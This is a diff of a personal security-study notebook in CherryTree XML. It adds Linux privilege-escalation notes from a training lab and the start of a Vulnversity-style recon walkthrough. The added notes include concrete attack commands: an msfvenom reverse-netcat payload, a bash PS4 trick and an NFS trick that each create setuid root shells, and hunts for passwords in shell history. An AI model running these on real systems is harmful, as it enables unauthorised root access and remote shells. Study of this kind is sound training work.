@@ -7057,7 +7057,7 @@ TO CHECK VULNERABILITIES
 
 </rich_text>
     <rich_text link="webs https://github.com/postfinance/kubenurse">https://github.com/postfinance/kubenurse</rich_text>
-    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1707255940">
+    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1707540256">
       <node name="Introductory Networking" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700447369" ts_lastsave="1700527383">
         <rich_text>OSI Model
 - Application
@@ -7619,7 +7619,7 @@ Enumeration
    → SUID files, interesting items to escalate privileges. SUID is a special type of file permission give to a file
    → Crontab contents: cron are show here</rich_text>
       </node>
-      <node name="Linux PrivEsc" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707255940" ts_lastsave="1707269298">
+      <node name="Linux PrivEsc" unique_id="248" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1707255940" ts_lastsave="1707539902">
         <rich_text>Multiple types of Privileges Escalation
 based in: </rich_text>
         <rich_text link="webs https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</rich_text>
@@ -7643,7 +7643,118 @@ Writable file permissions /etc/passwd
 - information about user accounts
 - readable by all world
 - contains user passwords and some versions this saved here
-- password hash: openssl passwd {password}</rich_text>
+- password hash: openssl passwd {password}
+
+Abusing SUID/GUID files
+- first step, check files with the SUID/GUID bit set.
+- files to run with permission of owner/group, in this case like root
+- SUID, set of permissions in linux, this is basic in user admin linux, the maximum number pf bits is 7, files with extra bit to owner
+- SUID like: rws-rwx-rwx
+- GUID like: rwx-rws-rwx
+- finding SUID binaries: in manual form: find / -perm -u=s -type f 2&gt;/dev/null
+
+Exploiting writeable /etc/passwd
+- essential information required during login
+- this is a plain text
+- contains a list of system accounts with user ID, group ID, home directory, shell and more
+- total of 7 fields
+
+Escaping vi editor
+- use of sudo -l, to list commands able as a super user, able to run certain commands as a root user without the root password
+- GTFOBins is a curated list of unix binaries that can be exploited
+
+Exploit crontab
+- long-running process that executes commands at specific dates and times
+- see commands: cat /etc/crontab
+- msfvenom -p cmd/unix/reverse_netcat lhost={ip} lport={port} R
+
+Exploting PATH variable
+- an environmental variable in Linux and Unix-like OS which specifies directories that hold executable programs
+- view: echo $PATH
+- basic process like list processes with ps
+- is possible rewrite the PATH variable to a location of our choosing
+
+Sudo - shell escape sequences
+- list programs with sudo permissions: sudo -l
+- use of GTFPbins, using to elevate permissions
+
+Sudo environment vaiables
+- is possible configure certain environment variables
+- to check variables: sudo -l
+- LD_PRELOAD this load a shared object before any others when a program is run and LD_LIBRARY provides a list of directories where shared libraries are searched
+- use of ldd to show libraries before to execute program
+- execute libraries: sudo LD_LIBRARY_PATH=/tmp
+
+Cron jobs, file permissions
+- programs or scripts which users can schedule to run specific times or intervals
+- is located in /etc/crontab
+- </rich_text>
+        <rich_text link="webs https://gtfobins.github.io/gtfobins/tar/">https://gtfobins.github.io/gtfobins/tar/</rich_text>
+        <rich_text>
+
+SUID / GUID executables
+- find all SUID/GUID executables: find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null
+- using SUID executable to shared object injection
+- use of strace on the file and search output for open/access for no such file errors: strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE “open|access|no such file”
+- using PATH environment variable and attempting to execute programs
+- use of string to show all printable chars, get service to execute, for example “service apache2 start” and use of the path: PATH=.:$PATH /usr/local/bin/suid-env
+- abusing shell features, in bash &lt;4.2-048 it is possible define shell functions with names that resemble file paths, create function in bash using : function {name} [code] and export -f {function name}
+- in debug mode bash (&lt;4.4) use VarEnv PS4 to display an extra prompt, env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' {bash file}
+
+Password and keys
+- possible get password if is typed by issue in command line
+- view content of history: cat ~/.*history | less
+- config files contain passwords in plaintext
+- backups with important files, show hidden files: ls -la
+
+NFS
+- files creates with NFS inherit the remote user's ID
+- cat /etc/exports
+- connect to root user in local machine
+- create tmp file: mkdir /tmp/nfs
+- mount to machine: mount -o rw,vers=3 {ip}:/tmp /tmp/nfs
+- msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+- chmod +xs /tmp/nfs/shell.elf
+- /tmp/shell.elf
+
+Kernel exploits
+- leave unstable state
+- exploit suggester 2: perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+- the most common uis dirty cow
+
+scripts: privesc-scripts</rich_text>
+      </node>
+      <node name="Vulnversity" unique_id="249" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1707540256" ts_lastsave="1707696312">
+        <rich_text>Reconnaissance
+- use of nmap to check wheere attack the machine
+- scan: `nmap -sV {ip}`
+- good flags
+   → -sV, determine version of services
+   → -p {x} or -p-, port scan for x port or all ports
+   → -Pn, disable host discovery and scan for open ports
+   → -A, Enables OS and version detection, executes in-build scripts
+   → -sC, scan with default nmap scripts
+   → -v, verbose mode
+   → -sU, UDP ort scan
+   → -sS, TCP SYN port scan
+
+Locating directories using gobuster
+- Use of gobuster
+- tool used to brute-force URIs (directories and files), DNS subdomains, and virtual host names
+- need a wordlist for gobuster, under /usr/share/wordlists
+- use: gobuster -dir -u </rich_text>
+        <rich_text link="webs http://{ip">http://{ip</rich_text>
+        <rich_text>} -w {wordlist location}
+- flags:
+   → -e, print the full URLs in your console
+   → -u, the target URL
+   → -w, Path to wordlist
+   → -U and -P, User and Password for basic auth
+   → -p {x}, Proxy to use requests
+   → -c {http cookies}, secify a cookie for simulating your auth
+
+Compromise the webserver
+- </rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
